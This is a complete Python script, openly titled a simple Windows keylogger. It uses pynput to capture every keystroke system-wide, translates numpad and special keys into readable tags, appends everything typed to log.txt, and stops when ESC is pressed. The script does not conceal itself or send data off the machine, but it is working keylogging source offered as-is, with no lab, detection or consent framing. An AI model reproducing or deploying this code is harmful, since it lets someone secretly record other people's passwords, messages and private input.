# ===============================================
#    ✧ Simple Windows Keylogger in Python ✧
# ===============================================

from pynput.keyboard import Key, Listener
import ctypes
import tkinter as tk
from tkinter import messagebox


SPECIAL_KEYS = {
    Key.space: " ",
    Key.enter: "[ENTER]",
    Key.backspace: "[BACKSPACE]",
    Key.shift: "[SHIFT]",
    Key.shift_r: "[SHIFT_R]",
    Key.ctrl_l: "[CTRL_L]",
    Key.ctrl_r: "[CTRL_R]",
    Key.alt: "[ALT]",
    Key.alt_l: "[ALT_L]",
    Key.alt_r: "[ALT_R]",
    Key.esc: "[ESC]",
    Key.tab: "[TAB]",
    Key.cmd: "[CMD]",
    Key.cmd_l: "[CMD_L]",
    Key.cmd_r: "[CMD_R]",
    Key.right: "[RIGHT]",
    Key.left: "[LEFT]",
    Key.up: "[UP]",
    Key.down: "[DOWN]",
    Key.num_lock: "[NUMLOCK]",
    Key.caps_lock: "[CAPSLOCK]",
    Key.delete: "[DELETE]",
    Key.end: "[END]",
    Key.home: "[HOME]",
    Key.page_up: "[PAGE_UP]",
    Key.page_down: "[PAGE_DOWN]",
    Key.insert: "[INSERT]",
    Key.print_screen: "[PRINT_SCREEN]",
    Key.scroll_lock: "[SCROLL_LOCK]",
    Key.pause: "[PAUSE]",
    Key.f1: "[F1]",
    Key.f2: "[F2]",
    Key.f3: "[F3]",
    Key.f4: "[F4]",
    Key.f5: "[F5]",
    Key.f6: "[F6]",
    Key.f7: "[F7]",
    Key.f8: "[F8]",
    Key.f9: "[F9]",
    Key.f10: "[F10]",
    Key.f11: "[F11]",
    Key.f12: "[F12]",
    Key.menu: "[MENU]",
    Key.media_play_pause: "[MEDIA_PLAY_PAUSE]",
    Key.media_next: "[MEDIA_NEXT]",
    Key.media_previous: "[MEDIA_PREVIOUS]",
    Key.media_volume_up: "[VOLUME_UP]",
    Key.media_volume_down: "[VOLUME_DOWN]",
}


def is_num_lock_active():
    return ctypes.windll.user32.GetKeyState(0x90) & 1


NUMPAD_KEYS = {
    12 : "5",
    96: "0",
    97: "1",
    98: "2",
    99: "3",
    100: "4",
    101: "5",
    102: "6",
    103: "7",
    104: "8",
    105: "9",
    110: "."
}


def write_in_file(key):
    with open('log.txt', 'a', encoding='utf-8') as log_file:
        log_file.write(key)


def when_pressed(key):
    try:
        if hasattr(key, 'vk') and key.vk in NUMPAD_KEYS: # Check for numpad keys
            numpad_key = NUMPAD_KEYS[key.vk]
            print(f'NumPad key "{numpad_key}" pressed')
            write_in_file(numpad_key)

        elif hasattr(key, 'char') and key.char is not None: # Check for regular keys (letters, numbers, ...)
            print(f'Key "{key.char}" pressed')
            write_in_file(key.char)

        else: # Otherwise, it's a special key
            special_key = SPECIAL_KEYS.get(key, f"[{key}]") 
            print(f'Special key "{special_key}" pressed')
            write_in_file(special_key)

    except Exception as error:
        print(f"Error: {error}")


# Stop the listener if ESC is pressed 
def when_released(key):
    if key == Key.esc:
        return False
    

with Listener(on_press = when_pressed, on_release = when_released) as listener:   
    listener.join()


# Create a tkinter window and display a message box ฅ^._.^ฅ
quitBox = tk.Tk()
quitBox.withdraw()
quitBox.attributes("-topmost", True)
messagebox.showinfo("Program Closed", "The keylogger has been closed !")

quitBox.destroy()